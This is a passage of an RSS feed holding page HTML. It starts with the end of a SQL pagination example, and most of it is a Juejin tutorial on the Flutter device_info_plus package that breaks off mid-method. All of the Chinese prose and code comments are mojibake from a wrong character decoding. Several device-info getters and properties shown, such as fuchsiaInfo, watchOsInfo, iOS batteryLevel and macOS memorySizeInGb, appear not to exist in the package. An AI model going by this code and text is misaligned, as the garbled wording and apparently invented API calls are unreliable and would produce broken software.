        <span class="hljs-built_in">ROW_NUMBER</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Id <span class="hljs-keyword">DESC</span>) <span class="hljs-keyword">AS</span> RowNum,
        <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">OVER</span>() <span class="hljs-keyword">AS</span> TotalCount, <span class="hljs-comment">-- è®¡ç®—æ€»æ¡æ•°</span>
        t.Id, t.è´¦å•å·, t.é‡‘é¢, t.äº¤æ˜“æ—¶é—´
    <span class="hljs-keyword">FROM</span> è´¦å•è¡¨ t
    <span class="hljs-keyword">WHERE</span> t.äº¤æ˜“æ—¶é—´ <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2026-01-01'</span>
) <span class="hljs-keyword">AS</span> TempTable
<span class="hljs-keyword">WHERE</span> TempTable.RowNum <span class="hljs-keyword">BETWEEN</span> (<span class="hljs-variable">@PageIndex</span> <span class="hljs-operator">-</span> <span class="hljs-number">1</span>) <span class="hljs-operator">*</span> <span class="hljs-variable">@PageSize</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-variable">@PageIndex</span> <span class="hljs-operator">*</span> <span class="hljs-variable">@PageSize</span>;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter â€”â€”device_info_plusè¯¦è§£]]></title>    <link>https://juejin.cn/post/7604279756599885860</link>    <guid>https://juejin.cn/post/7604279756599885860</guid>    <pubDate>2026-02-09T10:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604279756599885860" data-draft-id="7604175912482242566" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter â€”â€”device_info_plusè¯¦è§£"/> <meta itemprop="keywords" content="Flutter,Android,iOS"/> <meta itemprop="datePublished" content="2026-02-09T10:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Haha_bj"/> <meta itemprop="url" content="https://juejin.cn/user/2612027844214647"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter â€”â€”device_info_plusè¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612027844214647/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Haha_bj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T10:01:41.000Z" title="Mon Feb 09 2026 10:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><code>device_info_plus</code> æ˜¯ Flutter ç”Ÿæ€ä¸­æœ€æƒå¨çš„è®¾å¤‡ä¿¡æ¯è·å–åº“ï¼ˆå®˜æ–¹ç»´æŠ¤ï¼‰ï¼Œæ›¿ä»£äº†å·²åºŸå¼ƒçš„ <code>device_info</code>ï¼Œæ”¯æŒ Androidã€iOSã€Webã€Windowsã€macOSã€Linuxã€Android TVã€watchOS ç­‰å‡ ä¹æ‰€æœ‰ Flutter æ”¯æŒçš„å¹³å°ã€‚
åº“åœ°å€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Fdevice_info_plus" target="_blank" title="https://pub.dev/packages/device_info_plus" ref="nofollow noopener noreferrer">pub.dev/packages/deâ€¦</a></p>
<h3 data-id="heading-0">å®‰è£…</h3>
<ol>
<li>åœ¨é¡¹ç›®çš„ <code>pubspec.yaml</code> ä¸­æ·»åŠ ä¾èµ–ï¼š</li>
</ol>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">flutter:</span>
    <span class="hljs-attr">sdk:</span> <span class="hljs-string">flutter</span>
    <span class="hljs-attr">device_info_plus:</span> <span class="hljs-string">^12.3.0</span> <span class="hljs-comment"># å»ºè®®ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬</span>
</code></pre>
<ol start="2">
<li>æ‰§è¡Œå‘½ä»¤å®‰è£…ï¼š</li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino">flutter pub get
</code></pre>
<h2 data-id="heading-1">ä¸€ã€æ ¸å¿ƒåŸºç¡€ï¼šåŒ…æ¶æ„ä¸åˆå§‹åŒ–</h2>
<h3 data-id="heading-2">1. æ ¸å¿ƒç±»ä¸åˆå§‹åŒ–</h3>
<p><code>device_info_plus</code> çš„æ ¸å¿ƒæ˜¯ <code>DeviceInfoPlugin</code> å•ä¾‹ï¼Œé€šè¿‡å®ƒå¯ä»¥è·å–ä¸åŒå¹³å°çš„è®¾å¤‡ä¿¡æ¯å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:device_info_plus/device_info_plus.dart'</span>;

<span class="hljs-comment">// 1. åˆ›å»ºæ’ä»¶å®ä¾‹ï¼ˆå…¨å±€å”¯ä¸€ï¼‰</span>
<span class="hljs-keyword">final</span> DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();

<span class="hljs-comment">// 2. åˆå§‹åŒ–ï¼ˆéå¿…éœ€ï¼Œä½†å¼‚æ­¥æ“ä½œå»ºè®®åœ¨WidgetsFlutterBindingåˆå§‹åŒ–åæ‰§è¡Œï¼‰</span>
<span class="hljs-keyword">void</span> initDeviceInfo() <span class="hljs-keyword">async</span> {
  WidgetsFlutterBinding.ensureInitialized(); <span class="hljs-comment">// æ— ä¸Šä¸‹æ–‡æ—¶å¿…é¡»è°ƒç”¨</span>
  <span class="hljs-comment">// åç»­è·å–è®¾å¤‡ä¿¡æ¯çš„æ“ä½œ...</span>
}
</code></pre>
<h3 data-id="heading-3">2. å¹³å°ä¸ä¿¡æ¯ç±»å¯¹åº”è¡¨</h3>







































































<table><thead><tr><th>å¹³å°</th><th>ä¿¡æ¯è·å–æ–¹æ³•</th><th>æ ¸å¿ƒä¿¡æ¯ç±»</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>Android</td><td><code>await deviceInfoPlugin.androidInfo</code></td><td><code>AndroidDeviceInfo</code></td><td>è·å–å®‰å“è®¾å¤‡å‹å·ã€ç³»ç»Ÿç‰ˆæœ¬ã€å‚å•†ç­‰</td></tr><tr><td>iOS</td><td><code>await deviceInfoPlugin.iosInfo</code></td><td><code>IosDeviceInfo</code></td><td>è·å– iOS ç‰ˆæœ¬ã€è®¾å¤‡å‹å·ã€UUID ç­‰</td></tr><tr><td>Web</td><td><code>await deviceInfoPlugin.webBrowserInfo</code></td><td><code>WebBrowserInfo</code></td><td>è·å–æµè§ˆå™¨ã€æ“ä½œç³»ç»Ÿã€ç”¨æˆ·ä»£ç†ç­‰</td></tr><tr><td>Windows</td><td><code>await deviceInfoPlugin.windowsInfo</code></td><td><code>WindowsDeviceInfo</code></td><td>è·å– Windows ç³»ç»Ÿç‰ˆæœ¬ã€å¤„ç†å™¨ã€è®¾å¤‡åç­‰</td></tr><tr><td>macOS</td><td><code>await deviceInfoPlugin.macOsInfo</code></td><td><code>MacOsDeviceInfo</code></td><td>è·å– Mac ç³»ç»Ÿç‰ˆæœ¬ã€æœºå‹ã€å†…å­˜ç­‰</td></tr><tr><td>Linux</td><td><code>await deviceInfoPlugin.linuxInfo</code></td><td><code>LinuxDeviceInfo</code></td><td>è·å– Linux å‘è¡Œç‰ˆã€å†…æ ¸ç‰ˆæœ¬ç­‰</td></tr><tr><td>Android TV</td><td><code>await deviceInfoPlugin.androidTvInfo</code></td><td><code>AndroidTvDeviceInfo</code></td><td>åŒºåˆ†å®‰å“ç”µè§† / æ™®é€šå®‰å“è®¾å¤‡</td></tr><tr><td>watchOS</td><td><code>await deviceInfoPlugin.watchOsInfo</code></td><td><code>WatchOsDeviceInfo</code></td><td>è·å–è‹¹æœæ‰‹è¡¨ä¿¡æ¯</td></tr><tr><td>Wear OS</td><td><code>await deviceInfoPlugin.wearOsInfo</code></td><td><code>WearOsDeviceInfo</code></td><td>è·å–å®‰å“æ‰‹è¡¨ä¿¡æ¯</td></tr><tr><td>Fuchsia</td><td><code>await deviceInfoPlugin.fuchsiaInfo</code></td><td><code>FuchsiaDeviceInfo</code></td><td>é€‚é… Fuchsia ç³»ç»Ÿï¼ˆæš‚æœªæ™®åŠï¼‰</td></tr></tbody></table>
<h2 data-id="heading-4">äºŒã€å…¨å¹³å°æ ¸å¿ƒ API è¯¦è§£</h2>
<h3 data-id="heading-5">1. Android å¹³å°ï¼ˆ<code>AndroidDeviceInfo</code>ï¼‰</h3>
<p>æœ€å¸¸ç”¨çš„å±æ€§ï¼ˆè¦†ç›– 90% åœºæ™¯ï¼‰ï¼š</p>
<pre><code class="hljs language-Dart" lang="Dart">AndroidDeviceInfo androidInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.androidInfo;
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=== Android è®¾å¤‡ä¿¡æ¯ ==='</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'è®¾å¤‡å‹å·ï¼š<span class="hljs-subst">${androidInfo.model}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šPixel 8 Proã€Redmi K70</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç³»ç»Ÿç‰ˆæœ¬ï¼š<span class="hljs-subst">${androidInfo.version.release}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼š14ã€13</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'APIç­‰çº§ï¼š<span class="hljs-subst">${androidInfo.version.sdkInt}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼š34ï¼ˆAndroid 14ï¼‰ã€33ï¼ˆAndroid 13ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å‚å•†ï¼š<span class="hljs-subst">${androidInfo.manufacturer}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šGoogleã€Xiaomiã€Huawei</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å“ç‰Œï¼š<span class="hljs-subst">${androidInfo.brand}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šgoogleã€xiaomiã€huawei</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'è®¾å¤‡IDï¼š<span class="hljs-subst">${androidInfo.id}</span>'</span>); <span class="hljs-comment">// è®¾å¤‡å”¯ä¸€æ ‡è¯†ï¼ˆAndroid 10+ æ— æƒé™è·å–ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'äº§å“åï¼š<span class="hljs-subst">${androidInfo.product}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šcheetahï¼ˆPixel 8 Proï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ˜¯å¦çœŸæœºï¼š<span class="hljs-subst">${androidInfo.isPhysicalDevice}</span>'</span>); <span class="hljs-comment">// true=çœŸæœºï¼Œfalse=æ¨¡æ‹Ÿå™¨</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æŒ‡çº¹ï¼š<span class="hljs-subst">${androidInfo.fingerprint}</span>'</span>); <span class="hljs-comment">// ç³»ç»ŸæŒ‡çº¹ï¼ˆç”¨äºç‰ˆæœ¬åˆ¤æ–­ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç¡¬ä»¶åç§°ï¼š<span class="hljs-subst">${androidInfo.hardware}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šqcomï¼ˆé«˜é€šï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ”¯æŒçš„ABIsï¼š<span class="hljs-subst">${androidInfo.supportedAbis}</span>'</span>); <span class="hljs-comment">// æ”¯æŒçš„CPUæ¶æ„ï¼ˆarmeabi-v7aã€arm64-v8aç­‰ï¼‰</span>
</code></pre>
<h3 data-id="heading-6">2. iOS å¹³å°ï¼ˆ<code>IosDeviceInfo</code>ï¼‰</h3>
<pre><code class="hljs language-Dart" lang="Dart">IosDeviceInfo iosInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.iosInfo;
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=== iOS è®¾å¤‡ä¿¡æ¯ ==='</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'è®¾å¤‡åç§°ï¼š<span class="hljs-subst">${iosInfo.name}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šiPhone 15 Pro</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç³»ç»Ÿç‰ˆæœ¬ï¼š<span class="hljs-subst">${iosInfo.systemVersion}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼š17.2</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'è®¾å¤‡å‹å·ï¼š<span class="hljs-subst">${iosInfo.model}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šiPhone</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å…·ä½“æœºå‹ï¼š<span class="hljs-subst">${iosInfo.utsname.machine}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šiPhone16,1ï¼ˆå¯¹åº”iPhone 15 Proï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ˜¯å¦çœŸæœºï¼š<span class="hljs-subst">${iosInfo.isPhysicalDevice}</span>'</span>); <span class="hljs-comment">// true=çœŸæœºï¼Œfalse=æ¨¡æ‹Ÿå™¨</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'è®¾å¤‡UUIDï¼š<span class="hljs-subst">${iosInfo.identifierForVendor}</span>'</span>); <span class="hljs-comment">// åº”ç”¨å‚å•†å”¯ä¸€æ ‡è¯†ï¼ˆå¸è½½é‡è£…ä¼šå˜ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç³»ç»Ÿåç§°ï¼š<span class="hljs-subst">${iosInfo.systemName}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šiOSã€iPadOS</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç”µæ± ç”µé‡ï¼š<span class="hljs-subst">${iosInfo.batteryLevel}</span>'</span>); <span class="hljs-comment">// 0.0-1.0ï¼ˆéœ€æƒé™ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ˜¯å¦å……ç”µï¼š<span class="hljs-subst">${iosInfo.isCharging}</span>'</span>);
</code></pre>
<h3 data-id="heading-7">3. Web å¹³å°ï¼ˆ<code>WebBrowserInfo</code>ï¼‰</h3>
<pre><code class="hljs language-Dart" lang="Dart">WebBrowserInfo webInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.webBrowserInfo;
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=== Web æµè§ˆå™¨ä¿¡æ¯ ==='</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æµè§ˆå™¨åç§°ï¼š<span class="hljs-subst">${webInfo.browserName}</span>'</span>); <span class="hljs-comment">// BrowserName.chrome/edge/firefox/safariç­‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æµè§ˆå™¨ç‰ˆæœ¬ï¼š<span class="hljs-subst">${webInfo.browserVersion}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼š120.0.0.0</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ“ä½œç³»ç»Ÿï¼š<span class="hljs-subst">${webInfo.platform}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šWindowsã€macOSã€Android</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç”¨æˆ·ä»£ç†ï¼š<span class="hljs-subst">${webInfo.userAgent}</span>'</span>); <span class="hljs-comment">// å®Œæ•´UAå­—ç¬¦ä¸²</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'è¯­è¨€ï¼š<span class="hljs-subst">${webInfo.language}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šzh-CN</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ˜¯å¦ç§»åŠ¨è®¾å¤‡ï¼š<span class="hljs-subst">${webInfo.isMobile}</span>'</span>); <span class="hljs-comment">// true/false</span>
</code></pre>
<h3 data-id="heading-8">4. Windows å¹³å°ï¼ˆ<code>WindowsDeviceInfo</code>ï¼‰</h3>
<pre><code class="hljs language-Dart" lang="Dart">WindowsDeviceInfo windowsInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.windowsInfo;
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=== Windows è®¾å¤‡ä¿¡æ¯ ==='</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'è®¾å¤‡åç§°ï¼š<span class="hljs-subst">${windowsInfo.computerName}</span>'</span>); <span class="hljs-comment">// ç”µè„‘å</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç³»ç»Ÿç‰ˆæœ¬ï¼š<span class="hljs-subst">${windowsInfo.systemVersion}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼š10.0.22631</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å¤„ç†å™¨åç§°ï¼š<span class="hljs-subst">${windowsInfo.processorName}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šIntel(R) Core(TM) i7-12700H</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å†…å­˜å¤§å°(MB)ï¼š<span class="hljs-subst">${windowsInfo.memorySizeInMb}</span>'</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç³»ç»Ÿæ¶æ„ï¼š<span class="hljs-subst">${windowsInfo.systemArchitecture}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šX64</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æ„å»ºå·ï¼š<span class="hljs-subst">${windowsInfo.buildNumber}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼š22631</span>
</code></pre>
<h3 data-id="heading-9">5. macOS å¹³å°ï¼ˆ<code>MacOsDeviceInfo</code>ï¼‰</h3>
<pre><code class="hljs language-Dart" lang="Dart">MacOsDeviceInfo macInfo = <span class="hljs-keyword">await</span> deviceInfoPlugin.macOsInfo;
<span class="hljs-built_in">print</span>(<span class="hljs-string">'=== macOS è®¾å¤‡ä¿¡æ¯ ==='</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç³»ç»Ÿç‰ˆæœ¬ï¼š<span class="hljs-subst">${macInfo.osVersion}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼š14.1.1</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'æœºå‹ï¼š<span class="hljs-subst">${macInfo.model}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šMacBook Pro</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å¤„ç†å™¨ï¼š<span class="hljs-subst">${macInfo.processorName}</span>'</span>); <span class="hljs-comment">// ä¾‹ï¼šApple M3 Pro</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">'å†…å­˜å¤§å°(GB)ï¼š<span class="hljs-subst">${macInfo.memorySizeInGb}</span>'</span>);
<span class="hljs-built_in">print</span>(<span class="hljs-string">'UUIDï¼š<span class="hljs-subst">${macInfo.systemGUID}</span>'</span>); <span class="hljs-comment">// ç³»ç»Ÿå”¯ä¸€æ ‡è¯†</span>
</code></pre>
<h2 data-id="heading-10">ä¸‰ã€é«˜çº§ç”¨æ³•ï¼šå°è£…ä¸å®æˆ˜åœºæ™¯</h2>
<h3 data-id="heading-11">1. å°è£…é€šç”¨å·¥å…·ç±»ï¼ˆæ¨èï¼‰</h3>
<p>å°†è®¾å¤‡ä¿¡æ¯è·å–é€»è¾‘å°è£…ä¸ºå…¨å±€å·¥å…·ç±»ï¼Œé¿å…é‡å¤ä»£ç ï¼š</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:device_info_plus/device_info_plus.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/foundation.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeviceInfoUtil</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> DeviceInfoPlugin _plugin = DeviceInfoPlugin();
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> _isInitialized = <span class="hljs-keyword">false</span>;

  <span class="hljs-comment">// åˆå§‹åŒ–ï¼ˆå…¨å±€è°ƒç”¨ä¸€æ¬¡å³å¯ï¼‰</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; init() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (!_isInitialized) {
      WidgetsFlutterBinding.ensureInitialized();
      _isInitialized = <span class="hljs-keyword">true</span>;
    }
  }

  <span class="hljs-comment">// é€šç”¨ï¼šè·å–è®¾å¤‡ç±»å‹ï¼ˆæ‰‹æœº/å¹³æ¿/PC/æµè§ˆå™¨ï¼‰</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">String</span>&gt; getDeviceType() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (kIsWeb) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">"Webæµè§ˆå™¨"</span>;
    }
    <span class="hljs-comment">// defaultTargetPlatform è·å– è®¾ç½®çš„ç±»å‹ </span>
    <span class="hljs-keyword">switch</span> (defaultTargetPlatform) {
      <span class="hljs-keyword">case</span> TargetPlatform.android:
        <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.androidInfo;
        <span class="hljs-keyword">return</span> info.model.contains(<span class="hljs-string">"Tablet"</span>) ? <span class="hljs-string">"å®‰å“å¹³æ¿"</span> : <span class="hljs-string">"å®‰å“æ‰‹æœº"</span>;
      <span class="hljs-keyword">case</span> TargetPlatform.iOS:
        <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.iosInfo;
        <span class="hljs-keyword">return</span> info.model.contains(<span class="hljs-string">"iPad"</span>) ? <span class="hljs-string">"iPad"</span> : <span class="hljs-string">"iPhone"</span>;
      <span class="hljs-keyword">case</span> TargetPlatform.windows:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Windows PC"</span>;
      <span class="hljs-keyword">case</span> TargetPlatform.macOS:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Macç”µè„‘"</span>;
      <span class="hljs-keyword">case</span> TargetPlatform.linux:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Linuxè®¾å¤‡"</span>;
      <span class="hljs-keyword">default</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"æœªçŸ¥è®¾å¤‡"</span>;
    }
  }

  <span class="hljs-comment">// é€šç”¨ï¼šè·å–ç³»ç»Ÿç‰ˆæœ¬ï¼ˆå¦‚ "Android 14"ã€"iOS 17.2"ï¼‰</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">String</span>&gt; getSystemVersion() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (kIsWeb) {
      <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.webBrowserInfo;
      <span class="hljs-keyword">return</span> info.platform;
    }
    <span class="hljs-keyword">switch</span> (defaultTargetPlatform) {
      <span class="hljs-keyword">case</span> TargetPlatform.android:
        <span class="hljs-keyword">final</span> info = <span class="hljs-keyword">await</span> _plugin.androidInfo;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Android <span class="hljs-subst">${info.version.release}</span>"</span>;
